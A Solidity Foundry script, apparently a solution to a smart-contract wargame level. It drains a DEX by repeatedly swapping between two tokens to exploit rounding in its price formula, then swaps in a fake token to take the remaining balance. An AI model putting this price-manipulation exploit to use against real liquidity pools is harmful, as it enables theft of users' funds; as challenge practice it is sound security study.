pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/Console.sol";
import {IERC20} from "@openzeppelin/token/ERC20/IERC20.sol";


interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
    function getSwapAmount(address from, address to, uint256 amount) external view returns (uint256);
}

contract DexFlipper is Script {
    function setUp() public {}

    function run() public {
        address player = 0x3715592F5fDA21e57f13604551f928e3b9e5E3F5;
        address dexAddr = 0x94180c8250Ba510eb0E81F5F4C3A0D04f9bFe963;
        IDex dex = IDex(dexAddr);
        IERC20 t1 = IERC20(dex.token1());
        IERC20 t2 = IERC20(dex.token2());
        vm.startBroadcast();
        while (t1.balanceOf(dexAddr) > 0 && t2.balanceOf(dexAddr) > 0) {
            // takey...
            // approve a transfer for the entire amount of the token.
            uint256 bal = t1.balanceOf(player);
            uint256 dexT1Bal = t1.balanceOf(dexAddr);
            uint256 dexT2Bal = t2.balanceOf(dexAddr);
            uint256 expectedOut = dex.getSwapAmount(address(t1), address(t2), bal);
            dex.approve(dexAddr, bal);
            dex.swap(address(t1), address(t2), expectedOut > dexT2Bal ? dexT1Bal : bal);
            (t1, t2) = (t2, t1);
        }
        // for part 2, we already have all of t1.
        // so we just need to swap t2 into fake token.
        IERC20 fakeToken = IERC20(0x2c241757aA62D3A8DFBFd34A8449c487263fEa94); 
        fakeToken.approve(dexAddr, type(uint256).max);
        dex.swap(address(fakeToken), address(t2), fakeToken.balanceOf(player));
        vm.stopBroadcast();
    }
}